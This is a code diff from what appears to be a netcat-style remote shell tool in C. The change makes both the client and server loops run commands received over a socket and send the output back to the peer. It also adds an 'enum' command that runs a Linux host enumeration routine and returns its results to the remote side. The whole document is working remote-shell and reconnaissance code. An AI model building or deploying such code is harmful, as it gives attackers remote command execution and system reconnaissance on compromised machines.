@@ -6,6 +6,7 @@
 
 #include "netpipe.h"
 #include "doexec.h"
+#include "enum.h"
 
 typedef struct args
 {
@@ -96,10 +97,21 @@ void Client(char *address, char *port, int *type, int *family)
 
     while ((n = read(sockfd, buffer, MAXBUF)) > 0)
     {
-        char *exec = doexec(buffer);
-        if (write(a.dest, exec, sizeof(char) * strlen(exec)) == -1)
-        {
-            PrintError("write()");
+        if (!strcmp("enum\n", buffer)){
+            char *exec = linux_enum();
+            if (write(sockfd, exec, sizeof(char) * strlen(exec)) == -1)
+            {
+                PrintError("write()");
+            }
+            free(exec);
+
+        } else {
+            char *exec = doexec(buffer);
+            if (write(sockfd, exec, sizeof(char) * strlen(exec)) == -1)
+            {
+                PrintError("write()");
+            }
+            free(exec);
         }
     }
 
@@ -221,14 +233,21 @@ void Server(char *address, char *port, int *type, int *family)
 
     while ((n = read(clientfd, buffer, MAXBUF)) > 0)
     {
-        printf("STRLEN COMMAND: %d\n", strlen(buffer));
-        printf("BUFFER: %s\n", buffer);
-        char *exec = doexec(buffer);
-        if (write(clientfd, exec, sizeof(char) * strlen(exec)) == -1)
-        {
+        if (!strcmp("enum\n", buffer)){
+            char *exec = linux_enum();
+            if (write(clientfd, exec, sizeof(char) * strlen(exec)) == -1)
+            {
                 PrintError("write()");
+            }
+            free(exec);
+        } else {
+            char *exec = doexec(buffer);
+            if (write(clientfd, exec, sizeof(char) * strlen(exec)) == -1)
+            {
+                PrintError("write()");
+            }
+            free(exec);
         }
-        
     }
 
     if (n == -1)
